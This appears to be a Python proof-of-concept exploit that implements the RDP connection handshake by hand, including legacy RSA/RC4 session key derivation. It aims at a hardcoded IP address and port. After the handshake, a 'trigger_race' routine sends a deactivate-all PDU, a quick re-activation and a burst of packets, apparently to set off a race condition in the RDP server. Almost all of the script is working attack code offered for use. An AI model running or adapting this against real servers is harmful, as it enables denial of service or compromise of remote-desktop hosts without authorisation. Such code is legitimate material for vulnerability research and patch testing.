#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import struct
import time
import os
import hashlib

TARGET = "43.136.176.50"
PORT = 54896


def log(*a):
    print("[*]", *a, flush=True)


# BER (only MCS Connect Initial/Response)
def ber_len(n):
    if n < 0x80:
        return bytes([n])
    if n < 0x100:
        return bytes([0x81, n])
    return bytes([0x82, n >> 8, n & 0xFF])


def ber_int(v):
    if v < 0x80:
        return b"\x02\x01" + bytes([v])
    if v < 0x8000:
        return b"\x02\x02" + bytes([v >> 8, v & 0xFF])
    return b"\x02\x03\x00" + bytes([v >> 8, v & 0xFF])


def ber_octet(data):
    return b"\x04" + ber_len(len(data)) + data


# PER
def per_len(n):
    if n > 0x7F:
        return struct.pack(">H", n | 0x8000)
    return bytes([n])


def per_octet(data):
    return per_len(len(data)) + data


def frame(payload):
    body = b"\x02\xf0\x80" + payload
    return b"\x03\x00" + struct.pack(">H", len(body) + 4) + body


def recv_exact(s, n):
    b = b""
    while len(b) < n:
        c = s.recv(n - len(b))
        if not c:
            raise ConnectionError("closed")
        b += c
    return b


def recv_pkt(s):
    hdr = recv_exact(s, 4)
    ln = struct.unpack(">H", hdr[2:4])[0]
    return hdr + recv_exact(s, ln - 4)


# ---- RDP user data blocks (types 0xC001/0xC004/0xC002/0xC003, order core,cluster,security,network)
def client_core_data(w=1024, h=768):
    name = "TRIG".encode("utf-16-le")             # clientName (UTF-16)
    name = name[:30].ljust(32, b"\x00")
    d = struct.pack("<I", 0x0008000c)             # RdpVersion
    d += struct.pack("<HH", w, h)
    d += struct.pack("<H", 0xCA01)                # colorDepth
    d += struct.pack("<H", 0xAA03)                # SASSequence
    d += struct.pack("<I", 0x00000804)            # keyboardLayout
    d += struct.pack("<I", 0x47bb)                # clientBuild
    d += name                                     # clientName (32)
    d += struct.pack("<I", 4)                     # keyboardType
    d += struct.pack("<I", 0)                     # keyboardSubType
    d += struct.pack("<I", 12)                    # keyboardFunctionKey
    d += b"\x00" * 64                             # imeFileName
    d += struct.pack("<H", 0xCA01)                # postBeta2ColorDepth
    d += struct.pack("<H", 1)                     # clientProductId
    d += struct.pack("<I", 0)                     # serialNumber
    d += struct.pack("<H", 0x0018)                # highColorDepth
    d += struct.pack("<H", 0x0007)                # supportedColorDepths
    d += struct.pack("<H", 0x0421)                # earlyCapabilityFlags (from capture)
    d += b"\x00" * 64                             # clientDigProductId
    d += b"\x06"                                  # connectionType = AUTODETECT
    d += b"\x00"                                  # pad1
    d += struct.pack("<I", 0)                     # serverSelectedProtocol
    d += struct.pack("<I", w)                     # desktopPhysicalWidth
    d += struct.pack("<I", h)                     # desktopPhysicalHeight
    d += struct.pack("<H", 0)                     # desktopOrientation
    d += struct.pack("<I", 1)                     # desktopScaleFactor
    d += struct.pack("<I", 0)                     # deviceScaleFactor
    return struct.pack("<HH", 0xC001, len(d) + 4) + d


def client_cluster_data():
    d = struct.pack("<I", 0x0000000d) + struct.pack("<I", 0)
    return struct.pack("<HH", 0xC004, len(d) + 4) + d


def client_security_data():
    d = struct.pack("<I", 0x02) + struct.pack("<I", 0)   # encryptionMethods=0x02 (128-bit)
    return struct.pack("<HH", 0xC002, len(d) + 4) + d


def client_network_data():
    chans = [(b"rdpdr", 0x00c08000), (b"rdpsnd", 0x00c00000), (b"cliprdr", 0x0000c060)]
    d = struct.pack("<I", len(chans))
    for c, o in chans:
        d += c.ljust(8, b"\x00") + struct.pack("<I", o)
    return struct.pack("<HH", 0xC003, len(d) + 4) + d


def gcc_ccr():
    blocks = client_core_data() + client_cluster_data() + client_security_data() + client_network_data()
    g = b"\x00"                                    # choice 0
    g += b"\x05\x00\x14\x7c\x00\x01"               # OID
    g += per_len(len(blocks) + 14)                 # ConnectPDU length
    g += b"\x00"                                   # choice conferenceCreateRequest
    g += b"\x08"                                   # selection userData present
    g += b"\x00\x10"                               # numeric string
    g += b"\x00"                                   # padding
    g += b"\x01"                                   # sets
    g += b"\xc0"                                   # choice value+h221
    g += b"\x00\x44\x75\x63\x61"                   # "Duca"
    g += per_octet(blocks)
    return g


def domain_params(vals):
    body = b"".join(ber_int(v) for v in vals)
    return b"\x30" + ber_len(len(body)) + body


def mcs_connect_initial():
    target = domain_params([34, 2, 0, 1, 0, 1, 0xFFFF, 2])
    minimum = domain_params([1, 1, 1, 1, 0, 1, 0x420, 2])
    maximum = domain_params([0xFFFF, 0xFC17, 0xFFFF, 1, 0, 1, 0xFFFF, 2])
    gcc = gcc_ccr()
    content = (ber_octet(b"\x01") + ber_octet(b"\x01") + b"\x01\x01\xff" +
               target + minimum + maximum + ber_octet(gcc))
    return b"\x7f\x65" + ber_len(len(content)) + content


def mcs_attach_user():
    return b"\x28"


def mcs_channel_join(channel_id):
    return b"\x38" + struct.pack(">H", 7) + struct.pack(">H", channel_id)


def mcs_send_data(channel_id, data):
    return (b"\x64" + struct.pack(">H", 7) + struct.pack(">H", channel_id) +
            b"\x70" + per_octet(data))


def client_info_pdu():
    flags = 0x0001 | 0x0010 | 0x0080
    d = struct.pack("<I", 0) + struct.pack("<I", flags)
    d += struct.pack("<HHHHH", 0, 0, 0, 0, 0)
    d += (client_core_data() + client_cluster_data() +
          client_security_data() + client_network_data())
    return d


def confirm_active_pdu(share_id=0):
    caps = struct.pack("<HHHHHHHHHBB", 1, 1, 0x0200, 0, 0, 0, 0, 0, 0, 0, 0)
    caps = struct.pack("<HH", 0x0001, len(caps) + 4) + caps
    cap_list = struct.pack("<HH", 1, 0) + caps
    d = struct.pack("<HHH", 0, 0x0003, 0x1002)
    d += struct.pack("<H", 0x03EA) + struct.pack("<H", share_id)
    d += struct.pack("<HH", 0, 0) + struct.pack("<H", 0) + b"\x00" + cap_list
    return struct.pack("<H", len(d)) + d[2:]


def rc4(key, data):
    S = list(range(256))
    j = 0
    key = bytearray(key)
    klen = len(key)
    for i in range(256):
        j = (j + S[i] + key[i % klen]) & 0xFF
        S[i], S[j] = S[j], S[i]
    out = bytearray()
    i = j = 0
    for b in data:
        i = (i + 1) & 0xFF
        j = (j + S[i]) & 0xFF
        S[i], S[j] = S[j], S[i]
        out.append(b ^ S[(S[i] + S[j]) & 0xFF])
    return bytes(out)


def rsa_encrypt(plaintext, modulus_le, exponent_le):
    keylen = len(modulus_le)
    n = int.from_bytes(modulus_le[::-1], 'big')
    e = int.from_bytes(exponent_le[::-1], 'big')
    m_bytes = plaintext[::-1] + b"\x00" * (keylen - len(plaintext))
    m = int.from_bytes(m_bytes, 'big')
    c = pow(m, e, n)
    return c.to_bytes(keylen, 'big')[::-1]


def parse_server_security(resp):
    idx = resp.find(b"RSA1")
    assert idx != -1, "RSA1 not found in MCS connect response"
    length = struct.unpack("<I", resp[idx + 4:idx + 8])[0]  # on-wire length (modulus + 8 padding)
    modulus_len = length - 8
    exponent = resp[idx + 16:idx + 20]
    modulus = resp[idx + 20:idx + 20 + modulus_len]
    server_random = resp[idx - 48:idx - 16]  # 32 bytes before the TS_CERT header
    log("   parsed server: modulus_len=%d exponent=%s" % (modulus_len, exponent.hex()))
    return server_random, modulus, exponent


SALT = b"\xd1\x26\x9e"  # 40-bit salt


def salted_hash(inp, salt48, salt32a, salt32b):
    # MD5(Salt48 + SHA1(Input + Salt48 + Salt32a + Salt32b))
    sha1 = hashlib.sha1(inp + salt48 + salt32a + salt32b).digest()
    return hashlib.md5(salt48 + sha1).digest()


def derive_keys(client_random, server_random):
    premaster = client_random[:24] + server_random[:24]
    # MasterSecret = SaltedHash(premaster, "A"/"BB"/"CCC")
    master = b"".join(salted_hash(l, premaster, client_random, server_random)
                      for l in (b"A", b"BB", b"CCC"))
    # SessionKeyBlob = SaltedHash(master, "X"/"YY"/"ZZZ")
    session_blob = b"".join(salted_hash(l, master, client_random, server_random)
                            for l in (b"X", b"YY", b"ZZZ"))
    sign_key = session_blob[:16]
    decrypt_key = hashlib.md5(session_blob[16:32] + client_random + server_random).digest()
    encrypt_key = hashlib.md5(session_blob[32:48] + client_random + server_random).digest()
    return encrypt_key, decrypt_key, sign_key


def security_exchange(s, server_random, modulus, exponent):
    client_random = os.urandom(32)
    ciphertext = rsa_encrypt(client_random, modulus, exponent)
    data = b"\x01\x00\x00\x00" + ciphertext + b"\x00" * 8  # SEC_EXCHANGE_PKT + RSA ciphertext + padding
    s.sendall(frame(mcs_send_data(1003, data)))
    try:
        s.settimeout(1.0)
        pkt = recv_pkt(s)
        log("   sec resp:", pkt.hex()[:120])
    except Exception:
        pass
    s.settimeout(8)
    return client_random, server_random


def connect_rdp():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(8)
    s.connect((TARGET, PORT))
    log("1. TCP ok")

    x224 = b"\x06\xe0\x00\x00\x00\x00\x00"         # plain X.224 CR (no negotiation)
    s.sendall(b"\x03\x00" + struct.pack(">H", len(x224) + 4) + x224)
    log("2. X.224 confirm:", recv_pkt(s).hex())

    s.sendall(frame(mcs_connect_initial()))
    conn_resp = recv_pkt(s)
    log("3. MCS connect response:", conn_resp.hex()[:120])
    server_random, modulus, exponent = parse_server_security(conn_resp)

    s.sendall(frame(mcs_attach_user()))
    log("4. attach user confirm:", recv_pkt(s).hex()[:80])

    for ch in (1008, 1003, 1004, 1005, 1006):
        s.sendall(frame(mcs_channel_join(ch)))
        r = recv_pkt(s)
        log("   join", ch, "->", r.hex()[:60])

    client_random, server_random = security_exchange(s, server_random, modulus, exponent)
    encrypt_key, decrypt_key, sign_key = derive_keys(client_random, server_random)

    info = rc4(encrypt_key, client_info_pdu())
    data = b"\x48\x00\x00\x00" + info  # SEC_INFO_PKT | SEC_ENCRYPT header
    s.sendall(frame(mcs_send_data(1003, data)))
    log("5. client info sent (encrypted)")
    time.sleep(3)

    try:
        s.settimeout(25.0)
        while True:
            p = recv_pkt(s)
            log("   recv:", p.hex()[:100])
    except Exception as e:
        log("   drain done:", type(e).__name__)
    s.settimeout(8)

    s.sendall(frame(mcs_send_data(1003, confirm_active_pdu())))
    log("6. confirm active sent")
    return s


def trigger_race(s):
    deact = struct.pack("<HHH", 10, 0x0006, 0x1002) + struct.pack("<HH", 0, 0)
    s.sendall(frame(mcs_send_data(1003, deact)))
    log("7. deactivate-all sent")
    time.sleep(0.1)
    s.sendall(frame(mcs_send_data(1003, client_info_pdu())))
    log("8. re-activate client info sent")
    for _ in range(10):
        s.sendall(frame(mcs_send_data(1003, b"\x00")))
    log("9. fast-path poke done")
    time.sleep(1)


def main():
    s = connect_rdp()
    trigger_race(s)
    log("done")
    time.sleep(2)
    s.close()


if __name__ == "__main__":
    main()
